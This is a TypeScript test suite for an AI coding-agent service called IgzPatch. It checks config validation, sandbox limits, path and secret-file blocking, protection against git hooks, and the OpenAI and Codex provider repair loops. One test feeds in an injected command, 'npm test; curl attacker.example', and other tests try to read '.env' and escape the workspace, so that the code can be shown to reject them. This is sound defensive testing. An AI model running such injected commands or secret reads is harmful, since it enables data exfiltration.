import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { runCodexAgent } from "@/lib/agent/providers/codex";
import { enforceDiffPolicy, readDiffSummary } from "@/lib/agent/diff";
import { protectedGitArguments } from "@/lib/agent/git-security";
import { resolveAgentProvider } from "@/lib/agent/providers";
import { runOpenAiAgent } from "@/lib/agent/providers/openai";
import { createAgentToolbox } from "@/lib/agent/providers/tools";
import type { AgentProviderRequest } from "@/lib/agent/providers/types";
import { defaultRepoConfig, enforceWorkerRepoPolicy, type RepoConfig } from "@/lib/agent/repo-config";
import { loadRepoConfig } from "@/lib/agent/repo-config-local";

test("repo config validates supported providers", () => {
  withWorkspace((workspace) => {
    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "routing:",
        "  primary:",
        "    provider: openai",
        "    model: gpt-5.5",
      ].join("\n"),
    );

    const config = loadRepoConfig(workspace);
    assert.deepEqual(config.routing.primary, { provider: "openai", model: "gpt-5.5" });
  });
});

test("repo config defaults and validates the read-turn budget", () => {
  withWorkspace((workspace) => {
    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "agent:",
        "  max_iterations: 2",
      ].join("\n"),
    );
    assert.equal(loadRepoConfig(workspace).agent.max_read_turns, 12);

    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "agent:",
        "  max_iterations: 2",
        "  max_read_turns: 0",
      ].join("\n"),
    );
    assert.throws(() => loadRepoConfig(workspace), /greater than 0/);
  });
});

test("repo config rejects unknown policy fields", () => {
  withWorkspace((workspace) => {
    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "routing:",
        "  primary:",
        "    provider: codex",
        "    model: gpt-5.4",
        "    fallback: openai",
      ].join("\n"),
    );

    assert.throws(() => loadRepoConfig(workspace), /Unrecognized key/);
  });
});

test("repo config rejects the removed Ollama provider", () => {
  withWorkspace((workspace) => {
    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "routing:",
        "  primary:",
        "    provider: ollama",
        "    model: qwen3-coder",
      ].join("\n"),
    );

    assert.throws(() => loadRepoConfig(workspace), /Invalid enum value/);
  });
});

test("enabled repositories must configure at least one deterministic check", () => {
  withWorkspace((workspace) => {
    writeFileSync(
      join(workspace, ".igzpatch.yml"),
      [
        "version: 1",
        "enabled: true",
        "checks:",
        "  required: []",
      ].join("\n"),
    );
    assert.throws(() => loadRepoConfig(workspace), /At least one required check/);
  });
});

test("worker policy rejects excessive resources, images, and shell syntax", () => {
  const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
  config.sandbox.memory_mb = 9000;
  assert.throws(() => enforceWorkerRepoPolicy(config), /worker maximum/);
  config.sandbox.memory_mb = 4096;
  config.sandbox.image = "attacker/image:latest";
  assert.throws(() => enforceWorkerRepoPolicy(config), /not allowed/);
  config.sandbox.image = "node:22-bookworm";
  config.checks.required = ["npm test; curl attacker.example"];
  assert.throws(() => enforceWorkerRepoPolicy(config), /unsupported shell syntax/);
});

test("worker environment can override repository provider routing", () => {
  const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
  assert.deepEqual(
    resolveAgentProvider(
      { config },
      { IGZPATCH_AGENT_PROVIDER: "openai", IGZPATCH_AGENT_MODEL: "gpt-5.5" },
    ),
    { provider: "openai", model: "gpt-5.5" },
  );
  assert.throws(
    () => resolveAgentProvider({ config }, { IGZPATCH_AGENT_PROVIDER: "invalid" }),
    /Invalid enum value/,
  );
});

test("toolbox enforces writable and blocked path policies", async () => {
  await withWorkspaceAsync(async (workspace) => {
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "value.ts"), "export const value = 1;\n");
    writeFileSync(join(workspace, ".env"), "SECRET=hidden\n");
    const toolbox = createAgentToolbox({
      workspace,
      config: makeConfig({ provider: "openai", model: "gpt-5.4" }),
      timeoutMs: 5_000,
    });

    await toolbox.execute("replace_in_file", {
      path: "src/value.ts",
      old_text: "value = 1",
      new_text: "value = 2",
    });
    assert.match(readFileSync(join(workspace, "src", "value.ts"), "utf8"), /value = 2/);
    assert.equal(toolbox.mutationCount, 1);
    await assert.rejects(
      toolbox.execute("write_file", { path: "README.md", content: "not allowed" }),
      /outside paths.allowed/,
    );
    await assert.rejects(
      toolbox.execute("read_file", { path: ".env" }),
      /sensitive path/,
    );
    await assert.rejects(
      toolbox.execute("write_file", { path: "../escape.ts", content: "no" }),
      /escapes workspace/,
    );
  });
});

test("toolbox invalidates required checks after every mutation", async () => {
  await withWorkspaceAsync(async (workspace) => {
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "value.ts"), "export const value = 1;\n");
    const config = makeConfig({ provider: "openai", model: "gpt-5.4" });
    config.checks.required = ["true"];
    const toolbox = createAgentToolbox({ workspace, config, timeoutMs: 5_000 });

    assert.equal(toolbox.requiredChecksPassed, false);
    await toolbox.execute("run_check", { command: "true" });
    assert.equal(toolbox.requiredChecksPassed, true);
    await toolbox.execute("replace_in_file", {
      path: "src/value.ts",
      old_text: "value = 1",
      new_text: "value = 2",
    });
    assert.equal(toolbox.requiredChecksPassed, false);
  });
});

test("diff summary includes newly created files and paths containing spaces", async () => {
  await withWorkspaceAsync(async (workspace) => {
    execFileSync("git", ["init"], { cwd: workspace, stdio: "ignore" });
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "new file.ts"), "export const value = 1;\n");

    const summary = await readDiffSummary(workspace);
    assert.deepEqual(summary.changedFiles, ["src/new file.ts"]);
    assert.equal(summary.addedLines, 1);
    assert.equal(summary.deletedLines, 0);
  });
});

test("diff policy rejects binary and oversized changed files", async () => {
  await withWorkspaceAsync(async (workspace) => {
    execFileSync("git", ["init"], { cwd: workspace, stdio: "ignore" });
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "binary.dat"), Buffer.from([0, 1, 2, 3]));
    const binarySummary = await readDiffSummary(workspace);
    assert.deepEqual(binarySummary.binaryFiles, ["src/binary.dat"]);
    const config = makeConfig({ provider: "codex", model: "gpt-5.4" });
    assert.throws(() => enforceDiffPolicy(binarySummary, config), /Binary changes/);

    rmSync(join(workspace, "src", "binary.dat"));
    writeFileSync(join(workspace, "src", "large.ts"), "x".repeat(100));
    const largeSummary = await readDiffSummary(workspace);
    config.issue_scope.max_file_bytes = 50;
    assert.throws(() => enforceDiffPolicy(largeSummary, config), /above max 50/);
  });
});

test("protected host Git commands never execute repository hooks", () => {
  withWorkspace((workspace) => {
    execFileSync("git", ["init"], { cwd: workspace, stdio: "ignore" });
    execFileSync("git", ["config", "user.name", "Test"], { cwd: workspace });
    execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: workspace });
    writeFileSync(join(workspace, "value.txt"), "one\n");
    execFileSync("git", ["add", "value.txt"], { cwd: workspace });
    execFileSync("git", ["commit", "-m", "initial"], { cwd: workspace, stdio: "ignore" });
    const hook = join(workspace, ".git", "hooks", "pre-commit");
    writeFileSync(hook, "#!/bin/sh\ntouch hook-ran\n");
    chmodSync(hook, 0o755);
    writeFileSync(join(workspace, "value.txt"), "two\n");
    execFileSync("git", protectedGitArguments(["commit", "-am", "protected"]), {
      cwd: workspace,
      stdio: "ignore",
    });
    assert.equal(existsSync(join(workspace, "hook-ran")), false);
  });
});

test("sandbox-backed toolboxes never mutate through host file tools", async () => {
  await withWorkspaceAsync(async (workspace) => {
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "value.ts"), "export const value = 1;\n");
    const calls: string[] = [];
    const toolbox = createAgentToolbox({
      workspace,
      config: makeConfig({ provider: "openai", model: "gpt-5.4" }),
      timeoutMs: 5_000,
      runTool: async (name) => {
        calls.push(name);
        return {
          command: `sandbox tool ${name}`,
          exitCode: 0,
          stdout: JSON.stringify({ ok: true }),
          stderr: "",
          timedOut: false,
        };
      },
    });
    await toolbox.execute("write_file", { path: "src/value.ts", content: "host must not write" });
    assert.deepEqual(calls, ["write_file"]);
    assert.equal(readFileSync(join(workspace, "src", "value.ts"), "utf8"), "export const value = 1;\n");
  });
});

test("OpenAI provider performs a read-only pass then edits through Responses API tools", async () => {
  await withWorkspaceAsync(async (workspace) => {
    mkdirSync(join(workspace, "src"));
    writeFileSync(join(workspace, "src", "value.ts"), "export const value = 1;\n");
    const requests: Array<Record<string, unknown>> = [];
    const responses = [
      openAiResponse("resp-1", "call-read", "read_file", { path: "src/value.ts" }),
      openAiResponse("resp-2", "call-edit", "replace_in_file", {
        path: "src/value.ts",
        old_text: "value = 1",
        new_text: "value = 2",
      }),
      new Response(
        JSON.stringify({
          id: "resp-3",
          output_text: "Implemented the focused fix.",
          output: [],
        }),
        { status: 200 },
      ),
    ];
    const fetchImpl = (async (_input: string | URL | Request, init?: RequestInit) => {
      requests.push(JSON.parse(String(init?.body)) as Record<string, unknown>);
      const response = responses.shift();
      if (!response) throw new Error("Unexpected OpenAI request");
      return response;
    }) as typeof fetch;

    const request = makeRequest(workspace, { provider: "openai", model: "gpt-5.5" });
    request.config.checks.required = ["true"];
    const toolEvents: string[] = [];
    request.onToolEvent = async (event) => {
      toolEvents.push(`${event.name}:${event.ok}`);
    };
    const summary = await runOpenAiAgent(
      request,
      { provider: "openai", model: "gpt-5.5" },
      { fetchImpl, env: { OPENAI_API_KEY: "test-key" } },
    );

    assert.equal(summary, "Implemented the focused fix.");
    assert.match(readFileSync(join(workspace, "src", "value.ts"), "utf8"), /value = 2/);
    assert.deepEqual(toolNames(requests[0]), ["get_diff", "list_files", "read_file", "search_files"]);
    assert.ok(toolNames(requests[1]).includes("replace_in_file"));
    assert.ok(!toolNames(requests[1]).includes("run_check"));
    assert.ok(requests.every((body) => !("previous_response_id" in body)));
    assert.ok(requests.every((body) => body.store === false));
    assert.ok(requests.every((body) => {
      assert.deepEqual(body.include, ["reasoning.encrypted_content"]);
      return true;
    }));
    assert.deepEqual(inputTypes(requests[0]), ["message"]);
    assert.deepEqual(inputTypes(requests[1]), [
      "message",
      "reasoning",
      "function_call",
      "function_call_output",
    ]);
    assert.deepEqual(inputTypes(requests[2]), [
      "message",
      "reasoning",
      "function_call",
      "function_call_output",
      "reasoning",
      "function_call",
      "function_call_output",
    ]);
    assert.deepEqual(((requests[1]?.input as Array<Record<string, unknown>>)[1]), {
      type: "reasoning",
      id: "reasoning-resp-1",
      encrypted_content: "encrypted-resp-1",
      phase: "analysis",
    });
    assert.deepEqual(toolEvents, ["read_file:true", "replace_in_file:true", "run_check:true"]);
  });
});

test("OpenAI provider preserves repair iterations during read-heavy discovery", async () => {
  await withWorkspaceAsync(async (workspace) => {
    const requests: Array<Record<string, unknown>> = [];
    const responses = [
      openAiResponse("resp-1", "call-list", "list_files", {}),
      openAiResponse("resp-2", "call-read-1", "read_file", { path: "src/lib/incidents.ts" }),
      openAiResponse("resp-3", "call-read-2", "read_file", { path: "src/lib/sample-data.ts" }),
      openAiResponse("resp-4", "call-read-3", "read_file", { path: "src/app/page.tsx" }),
      openAiResponse("resp-5", "call-read-4", "read_file", { path: "tests/issue-2.test.ts" }),
      openAiResponse("resp-6", "call-edit", "replace_in_file", {
        path: "src/lib/incidents.ts",
        old_text: 'return incidents.filter((incident) => incident.status !== "resolved").length +\n    incidents.filter((incident) => incident.status === "resolved").length;',
        new_text: 'return incidents.filter((incident) => incident.status !== "resolved").length;',
      }),
      openAiMessageResponse("resp-7", "CHANGE_SUMMARY: Exclude resolved incidents"),
    ];
    const fetchImpl = (async (_input: string | URL | Request, init?: RequestInit) => {
      requests.push(JSON.parse(String(init?.body)) as Record<string, unknown>);
      const response = responses.shift();
      if (!response) throw new Error("Unexpected OpenAI request");
      return response;
    }) as typeof fetch;
    const checkCommands: string[] = [];
    const toolEvents: string[] = [];
    const request = makeRequest(workspace, { provider: "openai", model: "gpt-5.5" });
    request.config.agent.max_iterations = 2;
    request.config.agent.max_read_turns = 6;
    request.config.checks.required = ["npm test"];
    request.onToolEvent = async (event) => {
      toolEvents.push(`${event.name}:${event.ok}`);
    };
    request.sandbox = {
      ensureAvailable: async () => {},
      runCommand: async ({ command }) => {
        checkCommands.push(command);
        return {
          command,
          exitCode: 0,
          stdout: "Tests passed.",
          stderr: "",
          timedOut: false,
        };
      },
      runTool: async ({ name }) => ({
        command: `sandbox tool ${name}`,
        exitCode: 0,
        stdout: JSON.stringify({ ok: true }),
        stderr: "",
        timedOut: false,
      }),
      runCodex: async () => {
        throw new Error("Unexpected Codex call");
      },
      cleanupRuntime: () => {},
      dispose: async () => {},
    };

    const summary = await runOpenAiAgent(
      request,
      { provider: "openai", model: "gpt-5.5" },
      { fetchImpl, env: { OPENAI_API_KEY: "test-key" } },
    );

    assert.equal(summary, "CHANGE_SUMMARY: Exclude resolved incidents");
    assert.equal(requests.length, 7);
    assert.deepEqual(checkCommands, ["npm test"]);
    assert.ok(requests.every((body) => !toolNames(body).includes("run_check")));
    assert.equal(toolEvents.at(-1), "run_check:true");
  });
});

test("OpenAI provider feeds worker-controlled check failures back for repair", async () => {
  await withWorkspaceAsync(async (workspace) => {
    const requests: Array<Record<string, unknown>> = [];
    const responses = [
      openAiResponse("resp-1", "call-read", "read_file", { path: "src/value.ts" }),
      openAiResponse("resp-2", "call-edit-1", "write_file", {
        path: "src/value.ts",
        content: "export const value = 2;\n",
      }),
      openAiMessageResponse("resp-3", "Patch complete."),
      openAiResponse("resp-4", "call-edit-2", "write_file", {
        path: "src/value.ts",
        content: "export const value = 3;\n",
      }),
      openAiMessageResponse("resp-5", "CHANGE_SUMMARY: Correct exported value"),
    ];
    const fetchImpl = (async (_input: string | URL | Request, init?: RequestInit) => {
      requests.push(JSON.parse(String(init?.body)) as Record<string, unknown>);
      const response = responses.shift();
      if (!response) throw new Error("Unexpected OpenAI request");
      return response;
    }) as typeof fetch;
    const checkResults = [
      { exitCode: 1, stdout: "Expected value 3 but received 2." },
      { exitCode: 0, stdout: "Tests passed." },
    ];
    const request = makeRequest(workspace, { provider: "openai", model: "gpt-5.5" });
    request.config.agent.max_iterations = 5;
    request.config.checks.required = ["npm test"];
    request.sandbox = {
      ensureAvailable: async () => {},
      runCommand: async ({ command }) => {
        const result = checkResults.shift();
        if (!result) throw new Error("Unexpected required check");
        return {
          command,
          exitCode: result.exitCode,
          stdout: result.stdout,
          stderr: "",
          timedOut: false,
        };
      },
      runTool: async ({ name }) => ({
        command: `sandbox tool ${name}`,
        exitCode: 0,
        stdout: JSON.stringify({ ok: true }),
        stderr: "",
        timedOut: false,
      }),
      runCodex: async () => {
        throw new Error("Unexpected Codex call");
      },
      cleanupRuntime: () => {},
      dispose: async () => {},
    };

    const summary = await runOpenAiAgent(
      request,
      { provider: "openai", model: "gpt-5.5" },
      { fetchImpl, env: { OPENAI_API_KEY: "test-key" } },
    );

    assert.equal(summary, "CHANGE_SUMMARY: Correct exported value");
    assert.equal(checkResults.length, 0);
    assert.match(JSON.stringify(requests[3]?.input), /Expected value 3 but received 2/);
    assert.match(JSON.stringify(requests[3]?.input), /untrusted diagnostics/);
  });
});

test("OpenAI provider stops after the configured read-turn budget", async () => {
  await withWorkspaceAsync(async (workspace) => {
    const requests: Array<Record<string, unknown>> = [];
    const responses = [
      openAiResponse("resp-1", "call-list", "list_files", {}),
      openAiResponse("resp-2", "call-read", "read_file", { path: "src/value.ts" }),
    ];
    const fetchImpl = (async (_input: string | URL | Request, init?: RequestInit) => {
      requests.push(JSON.parse(String(init?.body)) as Record<string, unknown>);
      const response = responses.shift();
      if (!response) throw new Error("Unexpected OpenAI request beyond read budget");
      return response;
    }) as typeof fetch;
    const request = makeRequest(workspace, { provider: "openai", model: "gpt-5.5" });
    request.config.agent.max_read_turns = 2;
    request.sandbox = {
      ensureAvailable: async () => {},
      runCommand: async () => {
        throw new Error("Unexpected check call");
      },
      runTool: async ({ name }) => ({
        command: `sandbox tool ${name}`,
        exitCode: 0,
        stdout: JSON.stringify({ ok: true }),
        stderr: "",
        timedOut: false,
      }),
      runCodex: async () => {
        throw new Error("Unexpected Codex call");
      },
      cleanupRuntime: () => {},
      dispose: async () => {},
    };

    await assert.rejects(
      runOpenAiAgent(
        request,
        { provider: "openai", model: "gpt-5.5" },
        { fetchImpl, env: { OPENAI_API_KEY: "test-key" } },
      ),
      /exhausted 2 read turns/,
    );
    assert.equal(requests.length, 2);
  });
});

test("Codex provider invokes non-interactive workspace-write mode with prompt on stdin", async () => {
  await withWorkspaceAsync(async (workspace) => {
    let invocation: Parameters<typeof import("@/lib/agent/command").runProcess>[0] | undefined;
    const summary = await runCodexAgent(
      makeRequest(workspace, { provider: "codex", model: "gpt-5.4" }),
      { provider: "codex", model: "gpt-5.4" },
      {
        env: { IGZPATCH_CODEX_BIN: "/opt/codex" },
        runProcessImpl: async (options) => {
          invocation = options;
          return {
            command: "/opt/codex exec [IgzPatch prompt]",
            exitCode: 0,
            stdout: "Patch complete.\n",
            stderr: "",
            timedOut: false,
          };
        },
      },
    );

    assert.equal(summary, "Patch complete.");
    assert.equal(invocation?.command, "/opt/codex");
    assert.ok(invocation?.args?.includes("workspace-write"));
    assert.ok(invocation?.args?.includes("gpt-5.4"));
    assert.match(invocation?.stdin ?? "", /Issue number: #42/);
  });
});

test("Codex provider delegates execution to the configured Docker sandbox", async () => {
  await withWorkspaceAsync(async (workspace) => {
    const request = makeRequest(workspace, { provider: "codex", model: "gpt-5.4" });
    const sandboxInputs: Array<{ model: string; prompt: string; timeoutMs: number; readOnly: boolean }> = [];
    const toolEvents: string[] = [];
    request.onToolEvent = async (event) => {
      toolEvents.push(event.name);
    };
    request.sandbox = {
      ensureAvailable: async () => {},
      runCommand: async () => {
        throw new Error("Unexpected command call");
      },
      runTool: async () => {
        throw new Error("Unexpected tool call");
      },
      runCodex: async (input) => {
        sandboxInputs.push(input);
        return {
          command: "docker run [Codex provider]",
          exitCode: 0,
          stdout: input.readOnly
            ? `${JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "Inspect value.ts" } })}\n`
            : [
                JSON.stringify({ type: "item.started", item: { type: "file_change", changes: [{ path: "src/value.ts", kind: "update" }] } }),
                JSON.stringify({ type: "item.completed", item: { type: "file_change", changes: [{ path: "src/value.ts", kind: "update" }] } }),
                JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "Container patch complete." } }),
              ].join("\n"),
          stderr: "",
          timedOut: false,
        };
      },
      cleanupRuntime: () => {},
      dispose: async () => {},
    };

    const summary = await runCodexAgent(
      request,
      { provider: "codex", model: "gpt-5.4" },
      {
        runProcessImpl: async () => {
          throw new Error("Host Codex must not run");
        },
      },
    );

    assert.equal(summary, "Container patch complete.");
    assert.deepEqual(sandboxInputs.map((input) => input.readOnly), [true, false]);
    assert.equal(sandboxInputs[1]?.model, "gpt-5.4");
    assert.match(sandboxInputs[1]?.prompt ?? "", /<untrusted_issue>/);
    assert.match(sandboxInputs[1]?.prompt ?? "", /Inspect value\.ts/);
    assert.deepEqual(toolEvents, ["codex.file_change"]);
  });
});

test("Codex provider repairs failed worker-controlled checks within max iterations", async () => {
  await withWorkspaceAsync(async (workspace) => {
    const request = makeRequest(workspace, { provider: "codex", model: "gpt-5.4" });
    request.config.agent.max_iterations = 4;
    request.config.checks.required = ["npm test"];
    const sandboxInputs: Array<{ prompt: string; readOnly: boolean }> = [];
    const checkEvents: boolean[] = [];
    let checks = 0;
    request.onToolEvent = async (event) => {
      if (event.name === "codex.required_check") checkEvents.push(event.ok);
    };
    request.sandbox = {
      ensureAvailable: async () => {},
      runCommand: async () => {
        checks += 1;
        return checks === 1
          ? {
              command: "npm test",
              exitCode: 1,
              stdout: "Expected toolbar flex-wrap inside the 640px media query.",
              stderr: "",
              timedOut: false,
            }
          : {
              command: "npm test",
              exitCode: 0,
              stdout: "Tests passed.",
              stderr: "",
              timedOut: false,
            };
      },
      runTool: async () => {
        throw new Error("Unexpected tool call");
      },
      runCodex: async (input) => {
        sandboxInputs.push(input);
        return {
          command: "docker run [Codex provider]",
          exitCode: 0,
          stdout: JSON.stringify({
            type: "item.completed",
            item: {
              type: "agent_message",
              text: input.readOnly ? "Inspect the toolbar." : `Patch attempt ${sandboxInputs.length - 1}.`,
            },
          }),
          stderr: "",
          timedOut: false,
        };
      },
      cleanupRuntime: () => {},
      dispose: async () => {},
    };

    const summary = await runCodexAgent(request, { provider: "codex", model: "gpt-5.4" });

    assert.equal(summary, "Patch attempt 2.");
    assert.equal(checks, 2);
    assert.deepEqual(sandboxInputs.map((input) => input.readOnly), [true, false, false]);
    assert.match(sandboxInputs[2]?.prompt ?? "", /Expected toolbar flex-wrap inside the 640px media query/);
    assert.deepEqual(checkEvents, [false, true]);
  });
});

function makeRequest(
  workspace: string,
  primary: RepoConfig["routing"]["primary"],
): AgentProviderRequest {
  return {
    workspace,
    config: makeConfig(primary),
    timeoutMs: 5_000,
    run: {
      id: "run-123",
      repository_full_name: "example/demo",
      issue_number: 42,
      issue_title: "Fix the value",
      issue_body: "Acceptance criteria: the exported value is updated.",
      issue_url: "https://github.com/example/demo/issues/42",
    },
  };
}

function makeConfig(primary: RepoConfig["routing"]["primary"]): RepoConfig {
  const config = structuredClone(defaultRepoConfig);
  config.routing.primary = primary;
  config.paths.allowed = ["src/**", "tests/**"];
  config.paths.blocked = [".env*", "src/blocked/**"];
  config.agent.max_iterations = 3;
  config.agent.read_only_first_pass = true;
  return config;
}

function openAiResponse(
  id: string,
  callId: string,
  name: string,
  args: Record<string, unknown>,
): Response {
  return new Response(
    JSON.stringify({
      id,
      output: [
        {
          type: "reasoning",
          id: `reasoning-${id}`,
          encrypted_content: `encrypted-${id}`,
          phase: "analysis",
        },
        {
          type: "function_call",
          call_id: callId,
          name,
          arguments: JSON.stringify(args),
        },
      ],
    }),
    { status: 200 },
  );
}

function openAiMessageResponse(id: string, outputText: string): Response {
  return new Response(
    JSON.stringify({
      id,
      output_text: outputText,
      output: [
        {
          type: "message",
          role: "assistant",
          content: [{ type: "output_text", text: outputText }],
        },
      ],
    }),
    { status: 200 },
  );
}

function toolNames(body: Record<string, unknown> | undefined): string[] {
  const tools = (body?.tools ?? []) as Array<Record<string, unknown>>;
  return tools
    .map((tool) => String(tool.name))
    .sort();
}

function inputTypes(body: Record<string, unknown> | undefined): string[] {
  const inputs = (body?.input ?? []) as Array<Record<string, unknown>>;
  return inputs.map((input) => String(input.type ?? "message"));
}

function withWorkspace(callback: (workspace: string) => void): void {
  const workspace = mkdtempSync(join(tmpdir(), "igzpatch-provider-test-"));
  try {
    callback(workspace);
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
}

async function withWorkspaceAsync(callback: (workspace: string) => Promise<void>): Promise<void> {
  const workspace = mkdtempSync(join(tmpdir(), "igzpatch-provider-test-"));
  try {
    await callback(workspace);
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
}
